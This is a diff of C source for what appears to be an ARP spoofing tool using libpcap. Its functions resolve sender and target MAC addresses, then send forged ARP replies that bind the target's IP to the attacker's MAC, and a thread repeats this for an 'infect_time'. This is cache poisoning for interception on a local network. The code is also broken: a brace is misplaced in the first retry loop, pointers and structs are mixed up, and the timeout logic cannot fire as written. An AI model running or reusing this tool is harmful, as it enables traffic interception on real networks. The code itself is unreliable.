@@ -72,9 +72,9 @@ void print_arp(struct rq_packet* rq_p) {
 		print_ip(rq_p->arp_p.dest_ip_addr);
 }
 
-void send_recv_arp(pcap_t *handle, struct rq_packet* rq_p, struct spoof_list *sp_list, uint8_t *my_ip, uint8_t *my_ether, int i) {
+void send_recv_arp(pcap_t *handle, struct rq_packet* rq_p, struct spoof_list *sp_list, uint8_t *my_ip, uint8_t *my_ether) {
 
-	memcpy(rq_p->arp_p.dest_ip_addr, sp_list[i].sender_ip_addr, 4);
+	memcpy(rq_p->arp_p.dest_ip_addr, sp_list->sender_ip_addr, 4);
 	memcpy(rq_p->arp_p.source_ip_addr, my_ip, 4);
 	memcpy(rq_p->eth_header.ether_shost, my_ether, 6);
 	memcpy(rq_p->eth_header.ether_dhost, broadcast_ether, 6);
@@ -93,26 +93,34 @@ void send_recv_arp(pcap_t *handle, struct rq_packet* rq_p, struct spoof_list *sp
 	struct pcap_pkthdr *header;
 	struct ARP_Header *tmp_arp;
 
-	pcap_sendpacket(handle, (uint8_t*)&rq_p, sizeof(struct rq_packet));
 
-	//2. recv ARP reply
-	while(1) {
-		tmp = pcap_next_ex(handle, &header, &get_packet);
-		if(tmp<1) continue;
-		tmp_eth = (struct libnet_ethernet_hdr *)get_packet;
-		if(ntohs(tmp_eth->ether_type) != 0X0806) continue;
-		tmp_arp = (struct ARP_Header *)(get_packet + sizeof(libnet_ethernet_hdr));
-		if(ntohs(tmp_arp->arp_hw) == 0x0001 && ntohs(tmp_arp->arp_op) == 0x2) {
-			if(tmp_arp->source_ip_addr == rq_p.arp_p.dest_ip_addr) {
-				memcpy(rq_p->eth_header.ether_dhost, tmp_arp->source_ether_addr, 6);
-				break;
+	int timeout = 10;
+	while(timeout != 0) {
+		pcap_sendpacket(handle, (uint8_t*)&rq_p, sizeof(struct rq_packet));
+
+		//2. recv ARP reply
+		while(1) {
+			tmp = pcap_next_ex(handle, &header, &get_packet);
+			if(tmp<1) continue;
+			tmp_eth = (struct libnet_ethernet_hdr *)get_packet;
+			if(ntohs(tmp_eth->ether_type) != 0X0806) continue;
+			tmp_arp = (struct ARP_Header *)(get_packet + sizeof(libnet_ethernet_hdr));
+			if(ntohs(tmp_arp->arp_hw) == 0x0001 && ntohs(tmp_arp->arp_op) == 0x2) {
+				if(tmp_arp->source_ip_addr == rq_p.arp_p.dest_ip_addr) {
+					memcpy(rq_p->eth_header.ether_dhost, tmp_arp->source_ether_addr, 6);
+					break;
+				else if(timeout == 0) {
+					perror("Timeout ARP request Fail\n");
+				}
+				else timeout--;
+				}
 			}
 		}
 	}
 }
 
-void send_recv_target_arp(pcap_t *handle, struct rq_packet* rq_p, struct spoof_list *sp_list, uint8_t *my_ip, uint8_t *my_ether, int i) {
-	memcpy(rq_p->arp_p.dest_ip_addr, sp_list[i].target_ip_addr, 4);
+void send_recv_target_arp(pcap_t *handle, struct rq_packet* rq_p, struct spoof_list *sp_list, uint8_t *my_ip, uint8_t *my_ether) {
+	memcpy(rq_p->arp_p.dest_ip_addr, sp_list->target_ip_addr, 4);
 	memcpy(rq_p->arp_p.source_ip_addr, my_ip, 4);
 	memcpy(rq_p->eth_header.ether_shost, my_ether, 6);
 	memcpy(rq_p->eth_header.ether_dhost, broadcast_ether, 6);
@@ -131,36 +139,56 @@ void send_recv_target_arp(pcap_t *handle, struct rq_packet* rq_p, struct spoof_l
 	struct pcap_pkthdr *header;
 	struct ARP_Header *tmp_arp;
 
-	pcap_sendpacket(handle, (uint8_t*)&rq_p, sizeof(struct rq_packet));
-
-	//2. recv ARP reply
-	while(1) {
-		tmp = pcap_next_ex(handle, &header, &get_packet);
-		if(tmp<1) continue;
-		tmp_eth = (struct libnet_ethernet_hdr *)get_packet;
-		if(ntohs(tmp_eth->ether_type) != 0X0806) continue;
-		tmp_arp = (struct ARP_Header *)(get_packet + sizeof(libnet_ethernet_hdr));
-		if(ntohs(tmp_arp->arp_hw) == 0x0001 && ntohs(tmp_arp->arp_op) == 0x2) {
-			if(tmp_arp->source_ip_addr == rq_p.arp_p.dest_ip_addr) {
-				memcpy(rq_p->eth_header.ether_dhost, tmp_arp->source_ether_addr, 6);
-				break;
+	int timeout = 10;
+	while(timeout != 0) {
+		pcap_sendpacket(handle, (uint8_t*)&rq_p, sizeof(struct rq_packet));
+		while(1) {
+			tmp = pcap_next_ex(handle, &header, &get_packet);
+			if(tmp<1) continue;
+			tmp_eth = (struct libnet_ethernet_hdr *)get_packet;
+			if(ntohs(tmp_eth->ether_type) != 0X0806) continue;
+			tmp_arp = (struct ARP_Header *)(get_packet + sizeof(libnet_ethernet_hdr));
+			if(ntohs(tmp_arp->arp_hw) == 0x0001 && ntohs(tmp_arp->arp_op) == 0x2) {
+				if(tmp_arp->source_ip_addr == rq_p.arp_p.dest_ip_addr) {
+					memcpy(rq_p->eth_header.ether_dhost, tmp_arp->source_ether_addr, 6);
+					break;
+				}
+				else if(timeout == 0) {
+					perror("Timeout ARP request Fail\n");
+				}
+				else timeout--;
 			}
 		}
 	}
+
 }
 
-void send_arp_rply(pcap_t *handle, struct rq_packet* rp_p, uint8_t *sender_ether, struct spoof_list *sp_list, uint8_t *my_ether, int i) {
+void send_arp_rply(pcap_t *handle, struct spoof_list *sp_list, uint8_t *my_ether) {
+	
+	struct rq_packet rp_p; //reply packet
 
 	memcpy(rp_p->eth_header.ether_shost, my_ether, 6);
-	memcpy(rp_p->eth_header.ether_dhost, sender_ether, 6);
+	memcpy(rp_p->eth_header.ether_dhost, sp_list->sender_ether_addr, 6);
 
-	memcpy(rp_p->arp_p.dest_ip_addr, sp_list[i].sender_ip_addr, 4);
-	memcpy(rp_p->arp_p.source_ip_addr, sp_list[i].target_ip_addr, 4);
+	memcpy(rp_p->arp_p.source_ip_addr, sp_list->target_ip_addr, 4);
+	memcpy(rp_p->arp_p.dest_ip_addr, sp_list->sender_ip_addr, 4);
 
 	memcpy(rp_p->arp_p.source_ether_addr, my_ether, 6);
-	memcpy(rp_p->arp_p.dest_ether_addr, sender_ether, 6);
+	memcpy(rp_p->arp_p.dest_ether_addr, sp_list->sender_ether_addr, 6);
 	rp_p->arp_p.arp_op = htons(2); //reply
+
+	rp_p->eth_header.ether_type = htons(0x0806);
+	rp_p->arp_p.arp_hw = htons(1);
+	rp_p->arp_p.arp_pro = htons(0x0800);
+	rp_p->arp_p.arp_hlen = (uint8_t)6;
+	rp_p->arp_p.arp_plen = (uint8_t)4;
 
 	pcap_sendpacket(handle, (uint8_t *)&rp_p, sizeof(rp_p));
 
+}
+
+void *thread_reply(void *arg){
+	struct thread_spoof_arg *th_p = (thread_spoof_arg *)arg;
+	send_arp_rply(th_p->handle, th_p->list, th_p->my_ether);
+    sleep(infect_time);
 }
